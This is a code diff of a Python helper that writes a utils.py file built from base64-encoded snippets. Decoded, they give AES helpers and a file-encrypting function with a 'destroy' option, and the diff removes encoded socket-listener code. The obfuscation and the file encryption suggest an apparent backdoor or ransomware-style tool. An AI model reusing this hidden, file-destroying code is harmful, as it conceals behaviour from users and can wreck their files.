@@ -12,13 +12,6 @@ def create_utils():
 	body = base64.b64decode('CkJTWj0xNjtQQUQ9J3snCnBhZD1sYW1iZGEgczogcyArIChCU1ogLSBsZW4ocykgJSBCU1opKlBBRAo=')
 	enc = base64.b64decode('RW5jb2RlQUVTID0gbGFtYmRhIGMsIHM6IGJhc2U2NC5iNjRlbmNvZGUoYy5lbmNyeXB0KHBhZChzKSkpCg==')
 	dec = base64.b64decode('RGVjb2RlQUVTID0gbGFtYmRhIGMsIGU6IGMuZGVjcnlwdChiYXNlNjQuYjY0ZGVjb2RlKGUpKS5yc3RyaXAoUEFEKQo=')
-
-	srv = base64.b64decode('CmRlZiBzdGFydF9saXN0ZW5lcihwKToKCXRyeToKCQlzPXNvY2tldC5zb2NrZXQoc29ja2V0'\
-		  'LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuYmluZCgoIjAuMC4wLjAiLHApKQo'\
-		  'JZXhjZXB0IHNvY2tldC5lcnJvcjoKCQlyZXR1cm4gW10KCXJldHVybiBzCg==')
-	rcv = base64.b64decode('CmRlZiBjcmVhdGVfc29ja2V0KCk6CglzPVtdCgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KHN'\
-		  'vY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkKCWV4Y2VwdCBzb2NrZXQuZ'\
-		  'XJyb3I6CgkJcGFzcwoJcmV0dXJuIHMKCg==')
 	hide = base64.b64decode('CmRlZiBmZW5jcnlwdChmbmFtZSxkZXN0cm95KToKCWlmIG5vdCBvcy5wYXRoLmlzZmlsZS'\
 		   'hmbmFtZSk6CgkJZXhpdCgpCgllZmlsZT1mbmFtZS5zcGxpdCgiLyIpWy0xXS5zcGxpdCgi'\
 		   'LiIpWzBdKyIubG9sIgoJY29udGVudD1vcGVuKGZuYW1lLCJyYiIpLnJlYWQoKQoJaz1nZX'\
@@ -29,7 +22,7 @@ def create_utils():
 	see = base64.b64decode('ZGVmIGZkZWNyeXB0KGZuYW1lKToKCWVuY2Q9b3BlbihmbmFtZSwicmIiKS5yZWFkKCkKCWtm'\
 		  'PWZuYW1lLnNwbGl0KCIuIilbMF0rIi5rZXkiCglrPWJhc2U2NC5iNjRkZWNvZGUob3Blbihr'\
 		  'ZiwicmIiKS5yZWFkKCkpCglyZXR1cm4gRGVjb2RlQUVTKEFFUy5uZXcoayksZW5jZCkKCg==')
-	content = header+body+enc+dec+srv+rcv+hide+see
+	content = header+body+enc+dec+hide+see
 	open(os.getcwd()+'/utils.py', 'wb').write(content)
 
 
